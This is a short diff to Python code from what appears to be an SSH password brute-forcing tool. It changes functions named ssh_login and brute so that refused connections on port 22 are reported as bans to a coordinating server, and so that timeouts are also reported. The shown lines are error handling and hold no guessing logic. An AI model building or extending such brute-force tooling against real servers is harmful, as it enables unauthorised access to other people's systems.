@@ -147,6 +147,7 @@ def ssh_login(server_ip, username, password):
             return 6  # Connection timed out
         
         elif "Unable to connect to port 22" in str(e):
+            send_ban_to_server(server_ip)
             return 4
 
         return 0  # Other exceptions occurred
@@ -168,6 +169,9 @@ def brute(server_ip, guess, times=0):
             times += 1
             return brute(server_ip, guess, times)
 
+    if result == 4:
+        return 0
+    
     if result == 6:
         send_timeout_to_server(server_ip)
         return 0
